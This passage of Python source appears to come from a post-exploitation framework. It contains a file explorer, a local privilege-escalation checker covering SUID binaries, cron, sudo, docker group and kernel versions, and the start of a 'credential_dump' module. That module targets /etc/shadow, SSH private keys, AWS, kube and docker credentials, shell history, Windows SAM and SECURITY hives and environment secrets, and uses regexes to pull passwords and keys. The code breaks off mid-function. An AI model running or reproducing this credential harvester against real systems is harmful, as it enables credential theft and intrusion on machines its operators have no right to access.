        except (OSError, PermissionError):
            return None

    def _preview_file(self, path, byte_limit):
        try:
            with open(path, 'rb') as fh:
                snippet = fh.read(byte_limit)
            try:
                return snippet.decode('utf-8')
            except UnicodeDecodeError:
                return snippet.decode('latin-1', errors='ignore')
        except (OSError, PermissionError):
            return None

    def _resolve_username(self, uid):
        if not PWD_AVAILABLE:
            return str(uid)
        try:
            return pwd.getpwuid(uid).pw_name
        except KeyError:
            return str(uid)

    def _resolve_groupname(self, gid):
        if not GRP_AVAILABLE:
            return str(gid)
        try:
            return grp.getgrgid(gid).gr_name
        except KeyError:
            return str(gid)

    def _summarize_explorer_entries(self, entries, profile, errors, truncated):
        files = sum(1 for entry in entries if entry.type == 'file')
        directories = sum(1 for entry in entries if entry.type == 'dir')
        other = sum(1 for entry in entries if entry.type not in {'file', 'dir'})
        total_size = sum(entry.size for entry in entries if entry.type == 'file')
        depth_reached = max((entry.depth for entry in entries), default=0)
        return ExplorerSummary(
            base_path=profile['path'],
            total_entries=len(entries),
            files=files,
            directories=directories,
            other=other,
            total_size=total_size,
            depth_reached=depth_reached,
            truncated=truncated,
            errors=len(errors)
        )

    def _format_size(self, size_bytes):
        units = ['B', 'KB', 'MB', 'GB', 'TB']
        size = float(size_bytes)
        for unit in units:
            if size < 1024.0 or unit == 'TB':
                return f"{size:.1f}{unit}"
            size /= 1024.0

    def _format_timestamp(self, timestamp_value):
        try:
            return datetime.fromtimestamp(timestamp_value).strftime('%Y-%m-%d %H:%M:%S')
        except (ValueError, OSError):
            return 'N/A'

    def _display_file_explorer_results(self, profile, result):
        summary = result['summary']
        entries = result['entries']
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}FILE EXPLORER SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Base path : {Fore.CYAN}{summary.base_path}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Entries returned : {Fore.CYAN}{summary.total_entries}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Files / Dirs : {Fore.CYAN}{summary.files}{Style.RESET_ALL} / {Fore.CYAN}{summary.directories}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Total file size : {Fore.CYAN}{self._format_size(summary.total_size)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Depth reached : {Fore.CYAN}{summary.depth_reached}{Style.RESET_ALL}")
        if summary.truncated:
            print(f"{Fore.YELLOW}[!] Entry limit reached ({profile['max_entries']}){Style.RESET_ALL}")
        if summary.errors:
            print(f"{Fore.YELLOW}[!] Errors recorded: {summary.errors}{Style.RESET_ALL}")
        if entries:
            print(f"\n{Fore.GREEN}[+] Top results{Style.RESET_ALL}")
            header = f"{'TYPE':<6} {'SIZE':>10} {'MODIFIED':<19} NAME"
            print(header)
            print('-' * len(header))
            preview_count = min(10, len(entries))
            for entry in entries[:preview_count]:
                type_label = entry.type.upper()
                size_label = self._format_size(entry.size)
                modified_label = self._format_timestamp(entry.modified)
                name_label = entry.name
                if entry.type == 'dir':
                    name_label += '/'
                print(f"{type_label:<6} {size_label:>10} {modified_label:<19} {name_label}")
        if result['errors']:
            print(f"\n{Fore.YELLOW}[!] Explorer warnings{Style.RESET_ALL}")
            for message in result['errors'][:5]:
                print(f" - {message}")

    def _export_file_explorer_results(self, profile, result):
        timestamp = int(time.time())
        base = profile['export_prefix']
        base_name = f"{base}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        data = {
            'profile': {
                'path': profile['path'],
                'mode': profile['mode'],
                'max_depth': profile['max_depth'],
                'max_entries': profile['max_entries'],
                'include_hidden': profile['include_hidden']
            },
            'summary': result['summary'].__dict__,
            'entries': [entry.to_dict() for entry in result['entries']],
            'errors': result['errors'],
            'generated': timestamp
        }
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(data, fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("FILE EXPLORER REPORT\n")
                fh.write(f"Generated: {self._utc_timestamp()}\n")
                fh.write(f"Base path: {profile['path']}\n")
                fh.write(f"Mode: {profile['mode']}\n")
                fh.write(f"Entries: {result['summary'].total_entries}\n")
                fh.write(f"Files: {result['summary'].files} | Directories: {result['summary'].directories}\n")
                fh.write(f"Errors: {len(result['errors'])}\n\n")
                for entry in result['entries'][:50]:
                    fh.write(f"[{entry.type.upper()}] {entry.path}\n")
                    fh.write(f" Size: {entry.size} bytes\n")
                    fh.write(f" Modified: {self._format_timestamp(entry.modified)}\n")
                    fh.write(f" Owner: {entry.owner}:{entry.group}\n")
                    fh.write(f" Perms: {entry.permissions}\n")
                    if entry.hash:
                        fh.write(f" Hash: {entry.hash}\n")
                    if entry.preview:
                        fh.write(f" Preview: {entry.preview[:120]}\n")
                    fh.write('\n')
            return [json_path, txt_path]
        except OSError as exc:
            self.error_handler.handle_error(exc, "Exporting file explorer results")
            return []

    def run_file_explorer(self):
        """High-performance file system explorer"""
        profile = self._resolve_file_explorer_profile()
        if not profile:
            return None
        print(f"{Fore.CYAN}[*] Exploring filesystem on session {profile['session_id']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Path: {profile['path']}{Style.RESET_ALL}")
        cache_key = self._build_file_explorer_cache_key(profile)
        cached = self._get_cached_file_explorer_result(cache_key, profile['cache_ttl'])
        if cached:
            result = cached
            source = 'cache'
        else:
            result = self._execute_file_explorer(profile)
            if profile['cache_ttl'] > 0:
                self._store_file_explorer_cache(cache_key, result)
            source = 'fresh'
        self.logger.log(f"File explorer ({source}) on {profile['path']} returned {result['summary'].total_entries} entries")
        self._display_file_explorer_results(profile, result)
        export_paths = self._export_file_explorer_results(profile, result)
        if export_paths:
            print(f"\n{Fore.GREEN}[+] File explorer reports saved:{Style.RESET_ALL}")
            for path in export_paths:
                print(f" • {path}")
        return result
    
    def _resolve_privesc_profile(self):
        opts = self.module_options or {}
        session_id = (opts.get('session') or '1').strip() or '1'
        checks_requested = self._parse_list_option(opts.get('checks', 'suid,writable,path,cron,sudo,docker,kernel'))
        available_checks = set(self._get_privesc_check_catalog().keys())
        checks = [check for check in checks_requested if check in available_checks]
        if not checks:
            checks = ['suid', 'writable', 'cron']
        max_items = self._safe_int(opts.get('max_items'), 50, 10, 500)
        max_workers = self._safe_int(opts.get('max_workers'), 4, 1, 8)
        include_home = self._parse_bool_option(opts.get('include_home', 'true'), True)
        suid_paths = self._parse_list_option(opts.get('suid_paths', '/bin,/sbin,/usr/bin,/usr/sbin'))
        additional_paths = self._parse_list_option(opts.get('additional_paths', ''))
        writable_paths = self._parse_list_option(opts.get('writable_paths', '/tmp,/var/tmp,/dev/shm'))
        cron_paths = self._parse_list_option(opts.get('cron_paths', '/etc/crontab,/etc/cron.d,/var/spool/cron'))
        path_override = (opts.get('path_override') or '').strip()
        env_path = (opts.get('custom_env_path') or os.environ.get('PATH', ''))
        allow_sudo = self._parse_bool_option(opts.get('allow_sudo', 'false'), False)
        sudo_timeout = self._safe_float(opts.get('sudo_timeout'), 4.0, 1.0, 15.0)
        collect_references = self._parse_bool_option(opts.get('collect_references', 'true'), True)
        report_prefix = (opts.get('report_prefix') or 'privesc').strip() or 'privesc'
        cache_ttl = self._safe_float(opts.get('cache_ttl'), 0.0, 0.0, 300.0)
        profile = {
            'session_id': session_id,
            'checks': checks,
            'max_items': max_items,
            'max_workers': max_workers,
            'include_home': include_home,
            'suid_paths': suid_paths,
            'additional_paths': additional_paths,
            'writable_paths': writable_paths,
            'cron_paths': cron_paths,
            'path_override': path_override,
            'env_path': env_path,
            'allow_sudo': allow_sudo,
            'sudo_timeout': sudo_timeout,
            'collect_references': collect_references,
            'report_prefix': report_prefix,
            'cache_ttl': cache_ttl,
            'home_path': os.path.expanduser('~'),
            'platform': platform.system(),
            'kernel': platform.release()
        }
        return profile

    def _get_privesc_check_catalog(self):
        return {
            'suid': self._privesc_check_suid,
            'writable': self._privesc_check_writable,
            'path': self._privesc_check_path_hijack,
            'cron': self._privesc_check_cron,
            'sudo': self._privesc_check_sudo,
            'docker': self._privesc_check_docker,
            'kernel': self._privesc_check_kernel,
            'capabilities': self._privesc_check_capabilities
        }

    def _execute_privesc_checks(self, profile):
        catalog = self._get_privesc_check_catalog()
        finds = []
        errors = []
        start = time.time()

        def runner(name):
            func = catalog[name]
            try:
                check_findings, check_errors = func(profile)
            except Exception as exc:
                self.error_handler.handle_error(exc, f"PrivEsc check {name}")
                return [], [f"{name}: {exc}"]
            return check_findings, check_errors

        with concurrent.futures.ThreadPoolExecutor(max_workers=profile['max_workers']) as executor:
            future_map = {executor.submit(runner, name): name for name in profile['checks'] if name in catalog}
            for future in concurrent.futures.as_completed(future_map):
                check_name = future_map[future]
                check_findings, check_errors = future.result()
                finds.extend(check_findings)
                errors.extend(check_errors)
        runtime = time.time() - start
        summary = self._build_privesc_summary(profile, finds, errors, runtime)
        return {
            'findings': finds,
            'errors': errors,
            'summary': summary,
            'runtime': runtime
        }

    def _build_privesc_summary(self, profile, findings, errors, runtime):
        severity_map = Counter(find.severity for find in findings)
        return PrivEscSummary(
            session_id=profile['session_id'],
            checks_run=profile['checks'],
            total_findings=len(findings),
            severity_map=dict(severity_map),
            runtime=round(runtime, 3),
            errors=len(errors)
        )

    def _bound_findings(self, findings, profile):
        if len(findings) <= profile['max_items']:
            return findings
        return findings[:profile['max_items']]

    def _privesc_check_suid(self, profile):
        findings = []
        errors = []
        scan_paths = list(profile['suid_paths'])
        if profile['include_home'] and os.path.isdir(profile['home_path']):
            scan_paths.append(profile['home_path'])
        scan_paths.extend(profile['additional_paths'])
        seen = set()
        for base in scan_paths:
            base = base.strip()
            if not base or base in seen:
                continue
            seen.add(base)
            if not os.path.isdir(base):
                continue
            for root_dir, _, files in os.walk(base):
                for filename in files:
                    if len(findings) >= profile['max_items']:
                        break
                    path = os.path.join(root_dir, filename)
                    try:
                        st = os.lstat(path)
                    except (FileNotFoundError, PermissionError, OSError) as exc:
                        errors.append(f"suid:{path}: {exc}")
                        continue
                    if not stat.S_ISREG(st.st_mode):
                        continue
                    if st.st_mode & stat.S_ISUID:
                        owner = self._resolve_username(st.st_uid)
                        findings.append(PrivEscFinding(
                            category='suid',
                            title='SUID binary discovered',
                            severity='High',
                            description=f'SUID bit set on {path}',
                            evidence=f'Owner: {owner} Mode: {stat.filemode(st.st_mode)}',
                            remediation='Assess binary for exploitation or remove SUID bit if unnecessary.',
                            references=['https://gtfobins.github.io'] if profile['collect_references'] else [],
                            metadata={'path': path, 'owner': owner}
                        ))
                if len(findings) >= profile['max_items']:
                    break
            if len(findings) >= profile['max_items']:
                break
        return findings, errors

    def _privesc_check_writable(self, profile):
        findings = []
        errors = []
        for path in profile['writable_paths']:
            path = path.strip()
            if not path or not os.path.exists(path):
                continue
            try:
                st = os.stat(path)
            except OSError as exc:
                errors.append(f"writable:{path}: {exc}")
                continue
            world_writable = bool(st.st_mode & stat.S_IWOTH)
            if os.access(path, os.W_OK) and world_writable:
                findings.append(PrivEscFinding(
                    category='writable',
                    title='World-writable location',
                    severity='Medium',
                    description=f'{path} is world-writable and may allow privilege escalation.',
                    evidence=f'Permissions: {stat.filemode(st.st_mode)}',
                    remediation='Restrict permissions or monitor for abuse.',
                    metadata={'path': path}
                ))
        return self._bound_findings(findings, profile), errors

    def _privesc_check_path_hijack(self, profile):
        findings = []
        errors = []
        raw_path = profile['path_override'] or profile['env_path']
        if not raw_path:
            return findings, errors
        segments = [segment.strip() for segment in raw_path.split(os.pathsep) if segment.strip()]
        checked = set()
        for segment in segments:
            if segment in checked:
                continue
            checked.add(segment)
            if not os.path.isdir(segment):
                findings.append(PrivEscFinding(
                    category='path',
                    title='PATH entry missing',
                    severity='Low',
                    description=f'PATH includes non-existent directory {segment}',
                    evidence='Missing directories may allow hijacking with attacker-controlled paths.',
                    remediation='Remove or recreate the directory to avoid confusion.',
                    metadata={'path': segment}
                ))
                continue
            try:
                st = os.stat(segment)
            except OSError as exc:
                errors.append(f"path:{segment}: {exc}")
                continue
            if st.st_mode & stat.S_IWOTH:
                findings.append(PrivEscFinding(
                    category='path',
                    title='World-writable PATH entry',
                    severity='High',
                    description=f'{segment} is world-writable and part of PATH.',
                    evidence=f'Permissions: {stat.filemode(st.st_mode)}',
                    remediation='Remove from PATH or harden permissions to prevent binary hijacking.',
                    metadata={'path': segment}
                ))
            elif st.st_uid != 0:
                findings.append(PrivEscFinding(
                    category='path',
                    title='User-owned PATH entry',
                    severity='Medium',
                    description=f'{segment} is not owned by root.',
                    evidence=f'Owner UID: {st.st_uid}',
                    remediation='Ensure trusted PATH entries are root-owned to prevent tampering.',
                    metadata={'path': segment, 'owner': st.st_uid}
                ))
        return self._bound_findings(findings, profile), errors

    def _privesc_check_cron(self, profile):
        findings = []
        errors = []
        for entry in profile['cron_paths']:
            entry = entry.strip()
            if not entry:
                continue
            if os.path.isdir(entry):
                try:
                    files = [os.path.join(entry, item) for item in os.listdir(entry)]
                except OSError as exc:
                    errors.append(f"cron:{entry}: {exc}")
                    continue
                for file_path in files:
                    new_findings, new_errors = self._inspect_cron_file(file_path)
                    findings.extend(new_findings)
                    errors.extend(new_errors)
            elif os.path.isfile(entry):
                new_findings, new_errors = self._inspect_cron_file(entry)
                findings.extend(new_findings)
                errors.extend(new_errors)
        return self._bound_findings(findings, profile), errors

    def _inspect_cron_file(self, path):
        findings = []
        errors = []
        try:
            st = os.stat(path)
        except OSError as exc:
            errors.append(f"cron:{path}: {exc}")
            return findings, errors
        world_writable = bool(st.st_mode & stat.S_IWOTH)
        if world_writable:
            findings.append(PrivEscFinding(
                category='cron',
                title='World-writable cron file',
                severity='High',
                description=f'Cron file {path} is world-writable.',
                evidence=f'Permissions: {stat.filemode(st.st_mode)}',
                remediation='Restrict permissions to root-only to prevent schedule hijacking.',
                metadata={'path': path}
            ))
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    tokens = line.split()
                    command = tokens[-1] if tokens else ''
                    if command.startswith('/') and self._is_world_writable(os.path.dirname(command)):
                        findings.append(PrivEscFinding(
                            category='cron',
                            title='Cron executes from writable directory',
                            severity='High',
                            description=f'Cron entry executes {command} from writable location.',
                            evidence=line,
                            remediation='Move scripts to protected directories and harden permissions.',
                            metadata={'cron_file': path, 'command': command}
                        ))
        except OSError as exc:
            errors.append(f"cron:{path}: {exc}")
        return findings, errors

    def _privesc_check_sudo(self, profile):
        findings = []
        errors = []
        if not profile['allow_sudo']:
            return findings, errors
        sudo_path = shutil.which('sudo')
        if not sudo_path:
            errors.append('sudo binary not found')
            return findings, errors
        try:
            result = subprocess.run(
                [sudo_path, '-n', '-l'],
                capture_output=True,
                text=True,
                timeout=profile['sudo_timeout'],
                check=False
            )
            output = (result.stdout or '') + (result.stderr or '')
            if 'may run the following commands' in output.lower() or 'not allowed' not in output.lower():
                findings.append(PrivEscFinding(
                    category='sudo',
                    title='Sudo privileges detected',
                    severity='High',
                    description='User has sudo privileges. Review allowed commands for exploitation.',
                    evidence=output.strip()[:4000],
                    remediation='Restrict sudoers entries to least privilege.',
                    metadata={'return_code': result.returncode}
                ))
        except subprocess.TimeoutExpired:
            errors.append('sudo -l timed out')
        except OSError as exc:
            errors.append(f'sudo invocation failed: {exc}')
        return findings, errors

    def _privesc_check_docker(self, profile):
        findings = []
        errors = []
        if not GRP_AVAILABLE:
            return findings, errors
        try:
            docker_group = grp.getgrnam('docker')
        except KeyError:
            return findings, errors
        user = getpass.getuser()
        if user in docker_group.gr_mem:
            findings.append(PrivEscFinding(
                category='docker',
                title='User in docker group',
                severity='High',
                description='Docker group membership allows container escape to root.',
                evidence=f'User {user} is in docker group',
                remediation='Remove unnecessary docker group memberships.',
                references=['https://docs.docker.com/engine/security/security/'] if profile['collect_references'] else [],
                metadata={'user': user}
            ))
        return findings, errors

    def _privesc_check_kernel(self, profile):
        findings = []
        kernel_version = profile['kernel']
        known = [
            ('5.8', 'Potential Dirty Pipe (CVE-2022-0847)'),
            ('4.4', 'Potential Dirty COW (CVE-2016-5195)'),
            ('3.10', 'OverlayFS local root (multiple CVEs)')
        ]
        for signature, title in known:
            if kernel_version.startswith(signature):
                findings.append(PrivEscFinding(
                    category='kernel',
                    title=title,
                    severity='Medium',
                    description=f'Kernel {kernel_version} matches known vulnerable branch {signature}.',
                    evidence='Compare against vendor advisories to confirm exposure.',
                    remediation='Apply latest kernel patches or upgrade kernel version.',
                    references=['https://cve.mitre.org'] if profile['collect_references'] else [],
                    metadata={'kernel': kernel_version, 'match': signature}
                ))
                break
        return findings, []

    def _privesc_check_capabilities(self, profile):
        findings = []
        errors = []
        getcap_path = shutil.which('getcap')
        if not getcap_path:
            return findings, errors
        try:
            result = subprocess.run(
                [getcap_path, '-r', '/'],
                capture_output=True,
                text=True,
                timeout=5,
                check=False
            )
        except subprocess.TimeoutExpired:
            errors.append('getcap scan timed out')
            return findings, errors
        except OSError as exc:
            errors.append(f'getcap error: {exc}')
            return findings, errors
        for line in (result.stdout or '').splitlines():
            if not line:
                continue
            parts = line.split(None, 1)
            if len(parts) != 2:
                continue
            binary, capability = parts
            findings.append(PrivEscFinding(
                category='capabilities',
                title='Binary with elevated capabilities',
                severity='Medium',
                description=f'{binary} has capability {capability}',
                evidence=line.strip(),
                remediation='Remove unnecessary capabilities or restrict binary usage.',
                metadata={'binary': binary, 'capability': capability}
            ))
            if len(findings) >= profile['max_items']:
                break
        return findings, errors

    def _is_world_writable(self, path):
        try:
            st = os.stat(path)
        except OSError:
            return False
        return bool(st.st_mode & stat.S_IWOTH)

    def _display_privesc_results(self, profile, result):
        summary = result['summary']
        findings = result['findings']
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PRIVILEGE ESCALATION SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{summary.session_id}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Checks executed : {Fore.CYAN}{', '.join(summary.checks_run)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings : {Fore.CYAN}{summary.total_findings}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Runtime : {Fore.CYAN}{summary.runtime:.2f}s{Style.RESET_ALL}")
        if summary.errors:
            print(f"{Fore.YELLOW}[!] Errors recorded: {summary.errors}{Style.RESET_ALL}")
        if findings:
            print(f"\n{Fore.GREEN}[+] Top findings{Style.RESET_ALL}")
            for finding in findings[:5]:
                print(f" {Fore.YELLOW}{finding.severity:<6}{Style.RESET_ALL} {finding.category:<12} {finding.title}")
                print(f" {finding.description}")
        if result['errors']:
            print(f"\n{Fore.YELLOW}[!] Check warnings{Style.RESET_ALL}")
            for error in result['errors'][:5]:
                print(f" - {error}")

    def _export_privesc_results(self, profile, result):
        timestamp = int(time.time())
        base_name = f"{profile['report_prefix']}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        data = {
            'profile': {
                'session': profile['session_id'],
                'checks': profile['checks']
            },
            'summary': result['summary'].__dict__,
            'findings': [finding.to_dict() for finding in result['findings']],
            'errors': result['errors']
        }
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(data, fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("PRIVILEGE ESCALATION REPORT\n")
                fh.write(f"Generated: {self._utc_timestamp()}\n")
                fh.write(f"Session: {profile['session_id']}\n")
                fh.write(f"Checks: {', '.join(profile['checks'])}\n")
                fh.write(f"Findings: {result['summary'].total_findings}\n\n")
                for finding in result['findings']:
                    fh.write(f"[{finding.severity}] {finding.category} - {finding.title}\n")
                    fh.write(f"Description: {finding.description}\n")
                    fh.write(f"Evidence: {finding.evidence}\n")
                    fh.write(f"Remediation: {finding.remediation}\n\n")
            return [json_path, txt_path]
        except OSError as exc:
            self.error_handler.handle_error(exc, "Exporting privilege escalation results")
            return []

    def run_privilege_escalation(self):
        """Advanced privilege escalation analysis"""
        profile = self._resolve_privesc_profile()
        if not profile:
            return None
        print(f"{Fore.CYAN}[*] Running privilege escalation checks on session {profile['session_id']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Checks: {', '.join(profile['checks'])}{Style.RESET_ALL}")
        result = self._execute_privesc_checks(profile)
        self._display_privesc_results(profile, result)
        report_paths = self._export_privesc_results(profile, result)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Privilege escalation reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        return result
    
    def _detect_target_os(self, override):
        if override and override not in {'auto', ''}:
            return override
        system = platform.system().lower()
        if 'win' in system:
            return 'windows'
        if 'darwin' in system or 'mac' in system:
            return 'mac'
        return 'linux'

    def _resolve_credential_profile(self):
        raw = self.module_options
        session_id = (raw.get('session') or '1').strip() or '1'
        mode = (raw.get('mode', 'balanced') or 'balanced').lower()
        target_os = self._detect_target_os((raw.get('os') or 'auto').strip().lower())
        profiles = {
            'fast': {
                'preview_bytes': 512,
                'max_artifacts': 25,
                'max_total_bytes': 2 * 1024 * 1024,
                'max_workers': 4,
                'max_files_per_source': 5,
                'rate_limit': 15,
                'per_task_timeout': 2.0
            },
            'balanced': {
                'preview_bytes': 1024,
                'max_artifacts': 60,
                'max_total_bytes': 6 * 1024 * 1024,
                'max_workers': 8,
                'max_files_per_source': 10,
                'rate_limit': 25,
                'per_task_timeout': 3.0
            },
            'deep': {
                'preview_bytes': 2048,
                'max_artifacts': 120,
                'max_total_bytes': 16 * 1024 * 1024,
                'max_workers': 12,
                'max_files_per_source': 20,
                'rate_limit': 40,
                'per_task_timeout': 4.5
            }
        }
        defaults = profiles.get(mode, profiles['balanced'])
        preview_bytes = self._safe_int(raw.get('preview_bytes'), defaults['preview_bytes'], 128, 65536)
        max_artifacts = self._safe_int(raw.get('max_artifacts'), defaults['max_artifacts'], 5, 500)
        max_files_per_source = self._safe_int(raw.get('max_files_per_source'), defaults['max_files_per_source'], 1, 50)
        rate_limit = self._safe_int(raw.get('rate_limit'), defaults['rate_limit'], 0, 200)
        redaction = self._parse_bool_option(raw.get('redact', 'true'), True)
        collect_env = self._parse_bool_option(raw.get('include_env', 'true'), True)
        collect_processes = self._parse_bool_option(raw.get('include_processes', 'true'), True)
        custom_paths = self._sanitize_custom_paths(raw.get('custom_paths'))
        exclude_patterns = self._parse_list_option(raw.get('exclude_paths'))[:20]
        secret_keywords = ['password', 'passwd', 'secret', 'token', 'key', 'credential', 'aws', 'azure', 'gcloud']
        secret_keywords.extend([kw.lower() for kw in self._parse_list_option(raw.get('secret_keywords'))])
        secret_regexes = [
            r'password\s*[:=]\s*[^\s]{3,}',
            r'(?:aws|azure|gcp)_?(?:secret|token)[^\n]{0,40}',
            r'BEGIN [A-Z ]+ PRIVATE KEY',
            r'access_key\s*id\s*[:=]',
            r'authorization:\s*bearer\s+[A-Za-z0-9\-_.]+'
        ]
        secret_regexes.extend(self._parse_list_option(raw.get('secret_patterns')))
        credential_patterns = [
            re.compile(r'(?P<username>[\w.@+-]{2,})\s*[:]\s*(?P<password>[^\s]{3,})'),
            re.compile(r'username\s*[:=]\s*(?P<username>[\w.@+-]{2,}).{0,60}?password\s*[:=]\s*(?P<password>[^\s]+)', re.IGNORECASE | re.DOTALL),
            re.compile(r'aws_access_key_id\s*=\s*(?P<username>[A-Z0-9]{10,}).{0,60}?aws_secret_access_key\s*=\s*(?P<password>[A-Za-z0-9/+=]{20,})', re.IGNORECASE)
        ]
        compiled_patterns = []
        for pattern in secret_regexes:
            try:
                compiled_patterns.append(re.compile(pattern, re.IGNORECASE))
            except re.error as exc:
                if hasattr(self, 'logger'):
                    self.logger.warning(f"Invalid secret pattern '{pattern}': {exc}")
        report_prefix = raw.get('report_prefix', 'credential_dump') or 'credential_dump'
        report_prefix = re.sub(r'[^a-zA-Z0-9._-]', '_', report_prefix)
        audit_log = raw.get('audit_log', f"credential_dump_{session_id}_audit.log")
        rate_limiter = RateLimiter(max_requests=rate_limit, time_window=1) if rate_limit else None
        profile = {
            'session_id': session_id,
            'mode': mode,
            'target_os': target_os,
            'preview_bytes': preview_bytes,
            'max_artifacts': max_artifacts,
            'max_total_bytes': self._safe_int(raw.get('max_total_bytes'), defaults['max_total_bytes'], preview_bytes, 64 * 1024 * 1024),
            'max_workers': defaults['max_workers'],
            'max_files_per_source': max_files_per_source,
            'rate_limiter': rate_limiter,
            'secret_keywords': list({kw.lower(): None for kw in secret_keywords}.keys()),
            'secret_patterns': compiled_patterns,
            'credential_patterns': credential_patterns,
            'redact_samples': redaction,
            'collect_env': collect_env,
            'collect_processes': collect_processes,
            'custom_paths': custom_paths,
            'exclude_patterns': exclude_patterns,
            'report_prefix': report_prefix,
            'audit_log': audit_log,
            'per_task_timeout': defaults['per_task_timeout']
        }
        return profile

    def _sanitize_custom_paths(self, raw_value):
        sanitized = []
        for entry in self._parse_list_option(raw_value)[:40]:
            expanded = os.path.expanduser(entry.strip())
            if expanded and expanded not in sanitized:
                sanitized.append(expanded)
        return sanitized

    def _should_skip_path(self, path, exclude_patterns):
        for pattern in exclude_patterns:
            if fnmatch.fnmatch(path, pattern):
                return True
        return False

    def _build_credential_sources(self, profile):
        sources = []
        linux_sources = [
            {'name': 'System Accounts', 'type': 'file', 'paths': ['/etc/passwd'], 'category': 'system', 'artifact_type': 'text'},
            {'name': 'Shadow Hashes', 'type': 'file', 'paths': ['/etc/shadow'], 'category': 'system', 'artifact_type': 'text'},
            {'name': 'SSH Host Keys', 'type': 'directory', 'path': '/etc/ssh', 'category': 'keys', 'patterns': ['ssh_host_*key*']},
            {'name': 'Root SSH Keys', 'type': 'directory', 'path': '/root/.ssh', 'category': 'keys', 'patterns': ['id_*', '*.pub', '*.pem']},
            {'name': 'User SSH Keys', 'type': 'directory', 'path': os.path.expanduser('~/.ssh'), 'category': 'keys', 'patterns': ['id_*', '*.pem']},
            {'name': 'Shell History', 'type': 'file', 'paths': [os.path.expanduser('~/.bash_history')], 'category': 'history', 'artifact_type': 'text'},
            {'name': 'AWS Credentials', 'type': 'file', 'paths': [os.path.expanduser('~/.aws/credentials')], 'category': 'cloud', 'artifact_type': 'text'},
            {'name': 'Docker Config', 'type': 'file', 'paths': [os.path.expanduser('~/.docker/config.json')], 'category': 'applications', 'artifact_type': 'json'},
            {'name': 'Kube Config', 'type': 'file', 'paths': [os.path.expanduser('~/.kube/config')], 'category': 'cloud', 'artifact_type': 'yaml'},
            {'name': 'Backup Archives', 'type': 'directory', 'path': '/var/backups', 'category': 'archives', 'patterns': ['*.gz', '*.tar', '*.zip']}
        ]
        windows_sources = [
            {'name': 'Registry Hives', 'type': 'directory', 'path': 'C:/Windows/System32/config', 'category': 'system', 'patterns': ['SAM', 'SYSTEM', 'SECURITY']},
            {'name': 'ProgramData Credentials', 'type': 'directory', 'path': 'C:/ProgramData', 'category': 'applications', 'patterns': ['*.xml', '*.config', '*.cred']},
            {'name': 'RDP Credentials', 'type': 'directory', 'path': 'C:/Users', 'category': 'users', 'patterns': ['Default.rdp', '*.rdp']}
        ]
        common_sources = [
            {'name': 'Git Credentials', 'type': 'file', 'paths': [os.path.expanduser('~/.git-credentials')], 'category': 'applications', 'artifact_type': 'text'},
            {'name': 'GNUPG Directory', 'type': 'directory', 'path': os.path.expanduser('~/.gnupg'), 'category': 'keys', 'patterns': ['*.gpg', '*.asc']}
        ]
        if profile['target_os'] == 'windows':
            sources.extend(windows_sources)
        else:
            sources.extend(linux_sources)
        sources.extend(common_sources)
        for custom_path in profile['custom_paths']:
            if os.path.isdir(custom_path):
                sources.append({'name': f'Custom Directory - {custom_path}', 'type': 'directory', 'path': custom_path, 'category': 'custom', 'patterns': ['*']})
            else:
                sources.append({'name': f'Custom File - {custom_path}', 'type': 'file', 'paths': [custom_path], 'category': 'custom', 'artifact_type': 'text'})
        if profile['collect_env']:
            sources.append({'name': 'Environment Secrets', 'type': 'env', 'category': 'runtime'})
        if profile['collect_processes']:
            sources.append({'name': 'Process Arguments', 'type': 'process', 'category': 'runtime'})
        return sources

    def _collect_from_source(self, source, profile):
        artifacts = []
        warnings = []
        errors = []
        bytes_used = 0
        try:
            if source['type'] == 'file':
                for path in source.get('paths', []):
                    artifact, warn, consumed = self._collect_file_artifact(path, source, profile)
                    if artifact:
                        artifacts.append(artifact)
                    warnings.extend(warn)
                    bytes_used += consumed
            elif source['type'] == 'directory':
                dir_artifacts, warn, consumed = self._collect_directory_artifacts(source, profile)
                artifacts.extend(dir_artifacts)
                warnings.extend(warn)
                bytes_used += consumed
            elif source['type'] == 'env':
                env_artifacts, warn = self._collect_env_artifacts(source, profile)
                artifacts.extend(env_artifacts)
                warnings.extend(warn)
            elif source['type'] == 'process':
                proc_artifacts, warn = self._collect_process_artifacts(source, profile)
                artifacts.extend(proc_artifacts)
                warnings.extend(warn)
        except Exception as exc:
            errors.append(f"{source['name']}: {exc}")
            self.error_handler.handle_error(exc, f"Credential source {source['name']}")
        return {'artifacts': artifacts, 'warnings': warnings, 'errors': errors, 'bytes_used': bytes_used}

    def _collect_file_artifact(self, path, source, profile):
        warnings = []
        expanded = os.path.expanduser(path)
        resolved = os.path.realpath(expanded)
        if self._should_skip_path(resolved, profile['exclude_patterns']):
            return None, warnings, 0
        if not os.path.exists(resolved):
            warnings.append(f"Missing: {resolved}")
            return None, warnings, 0
        if not os.path.isfile(resolved):
            return None, warnings, 0
        try:
